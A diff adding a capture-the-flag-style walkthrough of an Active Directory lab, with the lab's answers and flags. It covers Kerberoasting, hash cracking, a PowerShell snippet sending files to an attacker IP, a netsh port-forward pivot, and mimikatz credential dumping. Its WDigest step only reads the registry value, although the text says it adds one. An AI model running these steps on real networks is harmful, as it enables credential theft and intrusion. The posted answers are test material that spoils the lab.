@@ -32,6 +32,125 @@ python3 penelope.py -p 443
 ```
 type c:\Users\Administrator\Desktop\flag.txt
 ```
-JusT_g3tt1ng_st@rt3d!
+**JusT_g3tt1ng_st@rt3d!**
 
 ## Q2. Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer 
+
+1. Transfer the PowerView.ps1 to the traget machine using any method that you want. And import the module
+```
+Import-Module .\PowerView.ps1
+```
+2. After importing the module find the users for which we can get the hash:
+```
+Get-DomainUser * -spn | select samaccountname
+```
+
+<img width="721" height="397" alt="image" src="https://github.com/user-attachments/assets/d8d6ee30-0c16-408b-8d5c-d8c721eed050" />
+
+**svc_sql**
+
+## Q3. Crack the account's password. Submit the cleartext value. 
+1. Our target is user is svc_sql account now lets gather the hashfor it:
+```
+Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
+```
+
+2. Copy the hash to your kali machine and crack it using:
+```
+hashcat -m 13100 <file> /usr/share/wordlists/rockyou.txt
+```
+**lucky7**  
+
+## Q4.  Submit the contents of the flag.txt file on the Administrator desktop on MS01
+
+This one is really very tricky and took a lot of time...
+
+My approach was to get an idea about how svc_sql user is linked with MS01 machine, so i used sharphound and transferred the zip to my kali and uploaded on the bloodhound -> _(if you want you can skip this step)_
+
+1. Transfer the sharphound to the machine using any tool.
+2. Then execute the following command:
+```
+.\SharpHound.exe -c All --zipfilename htbAD
+```
+3. Transfer the file (this is a bit tricky):
+```
+$client = New-Object System.Net.Sockets.TCPClient("10.10.15.43",9001)
+$stream = $client.GetStream()
+$bytes = [System.IO.File]::ReadAllBytes("C:\20260224100619_houded.zip")
+$stream.Write($bytes,0,$bytes.Length)
+$stream.Close()
+$client.Close()
+```
+
+4. Make sure you have the httpserver or updog running during this process
+
+5. Then upload the zip to the blood hound and navigate to path finder and search the realtion between these two:
+
+<img width="1852" height="547" alt="image" src="https://github.com/user-attachments/assets/6870a91b-938d-496d-a82d-b121f17e550e" />
+
+
+6. The svc_sql user has all the rights that is required in order connect to the MS01 machine, but we still lack a lot of info about MS01,
+
+### MS01 Enum:
+Find the ip of the machine using the `ping MS01` from the shell that we have obtained it comes out to be 172.16.6.50
+
+Now lets see if there are any open ports, for this I used the following command: 
+```
+powershell Test-NetConnection 172.16.6.50 -Port 3389
+```
+
+The output was `TcpTestSucceeded : True`, this basically means we can RDP on the machine..
+
+**But the question is HOW???**
+
+This can be done by setting up a proxy such that If am I connection to the target machine on port 8000 then it should connect to the machines 3389 port, this can be done by using netsh
+```
+netsh.exe interface portproxy add v4tov4 listenport=8000 listenaddress=10.129.4.64 connectport=3389 connectaddress=172.16.6.50
+```
+The upper command means: When someone connects to me on port 8000, forward that traffic to 172.16.6.50:3389.
+
+Now lets rdp to the machine:
+```
+xfreerdp3 /v:10.129.4.64:8000 /u:svc_sql /p:lucky7 +dynamic-resolution /drive:adtools,/home/offo/adtools 
+```
+What does the last part of the command do: basically allows you to share the drive on your local kali machine to the target machine, 
+`/drive:<share_name>,<local_path>`, and it will look something like this:
+
+<img width="276" height="89" alt="image" src="https://github.com/user-attachments/assets/7285286a-b4d9-4a93-a3d5-b06f32a11c77" />
+
+
+And then we can find the flag on the Desktop of the user Administrator:
+**spn$_r0ast1ng_on_@n_0p3n_f1re**
+
+## Q5. Find cleartext credentials for another domain user. Submit the username as your answer. 
+
+We will navigate to the Users dir, and there we can find an intresting user: Tpetty and its really a very intresting account..
+
+
+<img width="1790" height="429" alt="image" src="https://github.com/user-attachments/assets/f91b48f1-dcf4-4e03-b237-8c543e9f9472" />
+
+Because we even have DCsync permission on the domain (noice)
+
+**tpetty**
+
+## Q6. Submit this user's cleartext password. 
+
+Through the drive that i mounted when i used the xfreerdp command I transfered the mimikatz, now will execute it:
+```
+./mimikatz.exe 
+privilege::debug 
+sekurlsa::logonpasswords
+```
+
+This didnt helped, what will we do now is we will add a reg key and will then restart the computer and execute the same commands:
+```
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" | Select-Object UseLogonCredential
+```
+
+Afte restarting the computer, execute all the mimikatz commands again, and you will be able to see the clear text password of the user.
+
+**Sup3rS3cur3D0m@inU2eR**
+
+
+## Q7. What attack can this user perform? 
+Answer is simple Dcsync.
